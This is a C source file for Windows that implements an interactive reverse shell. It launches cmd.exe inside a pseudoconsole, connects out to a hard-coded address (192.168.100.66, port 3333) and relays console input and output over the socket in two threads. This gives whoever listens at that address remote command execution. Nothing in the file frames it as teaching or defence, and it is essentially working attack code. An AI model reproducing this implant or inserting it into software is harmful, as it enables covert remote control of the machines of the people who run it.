
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

#pragma warning(disable:4996)

// https://docs.microsoft.com/en-us/windows/console/creating-a-pseudoconsole-session


// https://docs.microsoft.com/en-us/windows/console/console-virtual-terminal-sequences

// https://docs.microsoft.com/en-us/windows/win32/procthread/creating-threads

typedef struct {
    HANDLE pipeHandle;
    SOCKET shellSocket;
} THREAD_ARG;

void InitConsole(HANDLE oldStdIn, HANDLE oldStdOut, HANDLE oldStdErr) {
    oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
    oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
    HANDLE hStdout = CreateFileA("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hStdin = CreateFileA("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
    SetStdHandle(STD_ERROR_HANDLE, hStdout);
    SetStdHandle(STD_INPUT_HANDLE, hStdin);
}


DWORD WINAPI ThreadReadSocketWritePipe(LPVOID lpParam) {
    THREAD_ARG* threadArg = (THREAD_ARG*)lpParam;
    int bufferSize=256;
    BOOL writeSuccess = FALSE;
    DWORD nBytesReceived = 0;
    DWORD bytesWritten = 0;

    do{
        char* bytesReceived = (char*)calloc(bufferSize, 1);
        if (bytesReceived == NULL)
            return TRUE;
        nBytesReceived = recv(threadArg->shellSocket, bytesReceived, bufferSize, 0);
        //printf("Data2: %.*s", nBytesReceived, bytesReceived);
        writeSuccess = WriteFile(threadArg->pipeHandle, bytesReceived, nBytesReceived, &bytesWritten, NULL);
        free(bytesReceived);
    } while (nBytesReceived > 0 && writeSuccess);
    printf("End ThreadReadSocketWritePipe\n");
    return FALSE;
}
DWORD WINAPI ThreadReadPipeWriteSocket(LPVOID lpParam) {
    THREAD_ARG* threadArg =(THREAD_ARG*)lpParam;
    int bufferSize = 256;
    DWORD bytesSent = 0;
    DWORD dwBytesRead = 0;
    BOOL readSuccess;

    
    do {
        char* bytesToWrite = (char*)calloc(bufferSize, 1);
        if (bytesToWrite == NULL)
            return TRUE;
        readSuccess = ReadFile(threadArg->pipeHandle, bytesToWrite, bufferSize, &dwBytesRead, NULL);
        bytesSent = send(threadArg->shellSocket, bytesToWrite, bufferSize, 0);
        printf("Data: %s", bytesToWrite);
        free(bytesToWrite);
    } while (bytesSent > 0 && readSuccess);
    printf("End ThreadReadPipeWriteSocket\n");
    
    return FALSE;

}

HANDLE StartThreadReadPipeWriteSocket(HANDLE outPipeOurSide, SOCKET shellSocket) {
    THREAD_ARG* threadArgReadPipeWriteSocket = (THREAD_ARG*)calloc(1, sizeof(THREAD_ARG));
    DWORD dwReadPipeWriteSocket;
    HANDLE hReadPipeWriteSocket;
    if (threadArgReadPipeWriteSocket == NULL)
        return NULL;

    threadArgReadPipeWriteSocket->pipeHandle = outPipeOurSide;
    threadArgReadPipeWriteSocket->shellSocket = shellSocket;
    hReadPipeWriteSocket = CreateThread(NULL, 0, ThreadReadSocketWritePipe, (LPVOID)threadArgReadPipeWriteSocket, 0, &dwReadPipeWriteSocket);
    if (hReadPipeWriteSocket == NULL)
        return NULL;
    return hReadPipeWriteSocket;
}

HANDLE StartThreadReadSocketWritePipe(HANDLE InputPipeWrite,SOCKET shellSocket) {
    THREAD_ARG* threadArgReadSocketWritePipe = (THREAD_ARG*)calloc(1, sizeof(THREAD_ARG));
    DWORD dwReadPipeWriteSocket;
    HANDLE hReadPipeWriteSocket;
    if (threadArgReadSocketWritePipe == NULL)
        return NULL;

    threadArgReadSocketWritePipe->pipeHandle = InputPipeWrite;
    threadArgReadSocketWritePipe->shellSocket = shellSocket;
    hReadPipeWriteSocket = CreateThread(NULL, 0, ThreadReadPipeWriteSocket, (LPVOID)threadArgReadSocketWritePipe, 0, &dwReadPipeWriteSocket);
    if (hReadPipeWriteSocket == NULL)
        return NULL;
    return hReadPipeWriteSocket;
}

SOCKET ConnectRemoteServer(char* ipAddress, int port) {
    struct sockaddr_in sAddr;
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (clientSocket == INVALID_SOCKET) {
        printf("Could not create socket : %d", WSAGetLastError());
        return FALSE;
    }
    sAddr.sin_addr.s_addr = inet_addr(ipAddress);
    sAddr.sin_family = AF_INET;
    sAddr.sin_port = htons(port);

    if (connect(clientSocket, (struct sockaddr*)&sAddr, sizeof(sAddr)) != SOCKET_ERROR)
        return clientSocket;
    return FALSE;
}

BOOL initWSAS() {
    WSADATA wsaData;
    int WSAStartupResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (WSAStartupResult != 0) {
        printf("[X] WSAStartup failed: %d.\n", WSAStartupResult);
        return FALSE;
    }
    return TRUE;
}


// Note: Most error checking removed for brevity.  
   // ...

   // Initializes the specified startup info struct with the required properties and
   // updates its thread attribute list with the specified ConPTY handle
HRESULT PrepareStartupInformation(HPCON hpc, STARTUPINFOEX* psi) {
    // Prepare Startup Information structure
    STARTUPINFOEX si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    // Discover the size required for the list
    size_t bytesRequired;
    InitializeProcThreadAttributeList(NULL, 1, 0, &bytesRequired);

    // Allocate memory to represent the list
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, bytesRequired);
    if (!si.lpAttributeList) {
        return E_OUTOFMEMORY;
    }

    // Initialize the list memory location
    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &bytesRequired)) {
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        return HRESULT_FROM_WIN32(GetLastError());
    }

    // Set the pseudoconsole information into the list
    if (!UpdateProcThreadAttribute(si.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
        hpc,
        sizeof(hpc),
        NULL,
        NULL)) {
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        return HRESULT_FROM_WIN32(GetLastError());
    }

    *psi = si;

    return S_OK;
}


HRESULT SetUpPseudoConsole(STARTUPINFOEX siEx) {
    // ...

    PCWSTR childApplication = L"C:\\windows\\system32\\cmd.exe";

    // Create mutable text string for CreateProcessW command line string.
    const size_t charsRequired = wcslen(childApplication) + 1; // +1 null terminator
    PWSTR cmdLineMutable = (PWSTR)HeapAlloc(GetProcessHeap(), 0, sizeof(wchar_t) * charsRequired);

    if (!cmdLineMutable) {
        return E_OUTOFMEMORY;
    }

    wcscpy_s(cmdLineMutable, charsRequired, childApplication);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Call CreateProcess
    if (!CreateProcessW(NULL,
        cmdLineMutable,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &siEx.StartupInfo,
        &pi)) {
        HeapFree(GetProcessHeap(), 0, cmdLineMutable);
        return HRESULT_FROM_WIN32(GetLastError());
    }


    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return S_OK;
    // ...
}

BOOL EnableVirtualTerminalSequenceProcessing() {
    // Set output mode to handle virtual terminal sequences
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD dwMode = 0;
    if (!GetConsoleMode(hOut, &dwMode)) {
        printf("Could not get console mode");
        return FALSE;
    }

    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    //dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
    if (!SetConsoleMode(hOut, dwMode)) {
        printf("Could not enable virtual terminal processing");
        return FALSE;
    }
    return TRUE;
}

// ...
int main() {
    BOOL fSuccess = FALSE;
    //HANDLE hIn;//hOut, 
    HANDLE outPipeOurSide, inPipeOurSide;
    HANDLE outPipePseudoConsoleSide, inPipePseudoConsoleSide;
    HPCON hPC = 0;
    STARTUPINFOEX siEx;

    SIZE_T attributeSize = 0;

    COORD terminalSize;
    terminalSize.X = 80;
    terminalSize.Y = 24;

    HANDLE oldStdIn = NULL;
    HANDLE oldStdOut = NULL;
    HANDLE oldStdErr = NULL;
    InitConsole(oldStdIn, oldStdOut, oldStdErr);
    const int BUFFER_SIZE_PIPE = 1048576;

    SECURITY_ATTRIBUTES* pSec = (SECURITY_ATTRIBUTES*)calloc(1, sizeof(SECURITY_ATTRIBUTES));
    if (pSec == NULL)
        return TRUE;
    pSec->nLength = sizeof(SECURITY_ATTRIBUTES);
    pSec->bInheritHandle = 1;
    pSec->lpSecurityDescriptor = NULL;



    // Create the in/out pipes:
    CreatePipe(&inPipePseudoConsoleSide, &inPipeOurSide, pSec, BUFFER_SIZE_PIPE);
    CreatePipe(&outPipeOurSide, &outPipePseudoConsoleSide, pSec, BUFFER_SIZE_PIPE);

    if (!EnableVirtualTerminalSequenceProcessing()) {
        printf("Fail to enable EnableVTMode !\n");
    }

    // Create the Pseudo Console, using the pipes
    if (CreatePseudoConsole(terminalSize, inPipePseudoConsoleSide, outPipePseudoConsoleSide, 0, &hPC) != S_OK) {
        printf("Fail to Create Pseudo Console !\n");
    }

    // Prepare the StartupInfoEx structure attached to the ConPTY.
    PrepareStartupInformation(hPC, &siEx);

    siEx.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
    siEx.StartupInfo.hStdInput = inPipePseudoConsoleSide;
    siEx.StartupInfo.hStdOutput = outPipePseudoConsoleSide;
    siEx.StartupInfo.hStdError = outPipePseudoConsoleSide;

    SetUpPseudoConsole(siEx);

    AllocConsole();

    ///////////////////////////////
    // connect 

    if (!initWSAS()) {
        printf("[x] Error initWSAS\n");
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, siEx.lpAttributeList);
        ClosePseudoConsole(hPC);
        return FALSE;
    }
    SOCKET shellSocket = ConnectRemoteServer("192.168.100.66", 3333); // loop if fail
    if (shellSocket == 0) {
        printf("[x] Error ConnectRemoteServer\n");
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, siEx.lpAttributeList);
        ClosePseudoConsole(hPC);
        return FALSE;
    }


    ///////////////////////////////
    // start thread
    HANDLE thReadSocketWritePipe = StartThreadReadSocketWritePipe(outPipeOurSide, shellSocket);
    if (thReadSocketWritePipe == NULL) {
        printf("[x] Error thReadSocketWritePipe\n");
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, siEx.lpAttributeList);
        ClosePseudoConsole(hPC);
        return FALSE;
    }
    HANDLE thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(inPipeOurSide, shellSocket);
    if (thThreadReadPipeWriteSocket == NULL) {
        printf("[x] Error thThreadReadPipeWriteSocket\n");
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, siEx.lpAttributeList);
        ClosePseudoConsole(hPC);
        return FALSE;
    }
    
    

    
    WaitForSingleObject(thThreadReadPipeWriteSocket,INFINITE);
    //WaitForSingleObject(thReadSocketWritePipe,INFINITE);
    system("pause");

    // close(shellSocket);

    CloseHandle(thReadSocketWritePipe);
    CloseHandle(thThreadReadPipeWriteSocket);



    // ...
   /* char* command = "whoami\r\n";
    char* command2 = "\t";
    char output[1024];
    DWORD dwWritten;
    ReadFile(outPipeOurSide, output, 1024, &dwWritten, NULL);
    printf("%.*s\n", dwWritten, output);
    ReadFile(outPipeOurSide, output,1024, &dwWritten, NULL);
    printf("%.*s\n", dwWritten, output);

    WriteFile(inPipeOurSide, command, (DWORD)strlen(command), &dwWritten, NULL);
    ReadFile(outPipeOurSide, output,1024, &dwWritten, NULL);
    printf("%.*s\n", dwWritten, output);

    WriteFile(inPipeOurSide, command2, (DWORD)strlen(command2), &dwWritten, NULL);
    ReadFile(outPipeOurSide, output, 1024, &dwWritten, NULL);
    printf("%.*s\n", dwWritten, output);
    ReadFile(outPipeOurSide, output, 1024, &dwWritten, NULL);
    printf("%.*s\n", dwWritten, output);*/

    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, siEx.lpAttributeList);
    ClosePseudoConsole(hPC);
    return fSuccess;
}